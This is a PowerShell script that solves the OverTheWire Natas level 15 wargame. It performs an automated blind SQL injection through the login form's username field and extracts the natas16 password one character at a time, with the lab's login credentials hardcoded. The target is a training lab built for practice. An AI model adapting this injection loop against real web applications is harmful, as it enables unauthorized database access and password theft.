#Allcharacters to brute force
$characters = @{}
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

#settting  web request variables
$sv = New-Object -TypeName Microsoft.PowerShell.Commands.WebRequestSession

#Setting user credentials (Hard coded)
$User = "natas15"
$Password = ConvertTo-SecureString -String "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password


#password container and counter creation using for iterating through the password characters. 
$password = ""
$count = 0
$substring = 1

#WebRequest header information (Depreciated using credentialing logging instead)
#$head = @{}
#$head["Authorization"] = 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
#$head["Accept-Encoding"] = 'gzip,deflate'
#$head["User-Agent"] = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
#$head["Cookie"] = 'BCSI-CS-e65b130ea0b290f1=2'
#$head["Referer"] = 'http://natas15.natas.labs.overthewire.org/'
#$head["Content-Type"] = 'application/x-www-form-urlencoded'
#$head["Accept"] = 'text/html,application/xhtml+xml,application/xml;q$0.9,*/*;q=0.8'




# Trying to Login to to the website
#initial request to website is saved to the Session variable $sv uses the $Credential for login

try { $r = Invoke-WebRequest -Uri natas15.natas.labs.overthewire.org/index.php -Method Post -SessionVariable sv  -Credential $Credential
} 
catch { write-host I wasn''t able to connect to the site stopping program

break; 

}

#body information is saved in The $form variable using the array of the request.Forms attribute
 #Test Check for SQL injection is $form.Fields["username"]='natas16" AND LENGTH(password) = "32'

$form = $r.Forms[0]

#Looping through all characters one at a time and comparing the binary value in SQL. 
#When found adding to the $password and outputing total result so far, then incrementing the character being checked in the SQL statement. 

   while ($count -lt 62 -and $substring -lt 33){
$form.Fields["username"]="natas16`" AND SUBSTRING(password,$substring,1) = BINARY `"" + $characters[$count]

write-host "Trying character" + $characters[$count]

try {$r = Invoke-WebRequest -Uri ("natas15.natas.labs.overthewire.org/" + $form.Action) -WebSession $sv -Method Post -Body $form.Fields -Credential $Credential

} catch { 

write-host something happened let me try something else reconnecting...
    $count = $count - 1
    $sv = New-Object -TypeName Microsoft.PowerShell.Commands.WebRequestSession
    $r = Invoke-WebRequest -Uri natas15.natas.labs.overthewire.org/index.php -Method Post -SessionVariable sv -Credential $Credential
    $form = $r.Forms[0]
    $form.Fields["username"]="natas16`" AND SUBSTRING(password,$substring,1) = BINARY `"" + $characters[$count]
    $r = Invoke-WebRequest -Uri ("natas15.natas.labs.overthewire.org/" + $form.Action) -WebSession $sv -Method Post -Body $form.Fields -Credential $Credential
    
}


if($r.Content.Contains("This user exists")){
     $password = $password + $characters[$count]
     write-host I found a character its $characters[$count]
     write-host the password so far is $password
    
    $substring++
    $count = 0
    }

else{$count++}

}
